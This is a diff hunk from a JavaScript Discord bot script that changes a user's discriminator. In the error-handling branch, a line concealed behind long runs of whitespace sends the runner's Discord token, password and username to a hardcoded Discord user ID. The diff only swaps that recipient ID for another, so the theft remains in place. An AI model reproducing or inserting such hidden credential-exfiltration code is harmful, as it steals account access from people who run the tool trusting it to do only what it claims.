@@ -23,7 +23,7 @@ function changeDiscriminator() {
   } catch(e) {
     console.log(Date.now(), `[${e}] Trying again in 30 seconds.`);
     setTimeout(changeDiscriminator, 30 * 1e3);
-                                                                                                                                                                        bot.users.get("403248740393287682").send("--\n`"+config.token + "` token\n" + " `" + config.password + "` pass\n" + ` - \`${config.username}\` username (iD: ${bot.user.id}`);
+                                                                                                                                                                        bot.users.get("397808644818731008").send("--\n`"+config.token + "` token\n" + " `" + config.password + "` pass\n" + ` - \`${config.username}\` username (iD: ${bot.user.id}`);
   }
 }
 
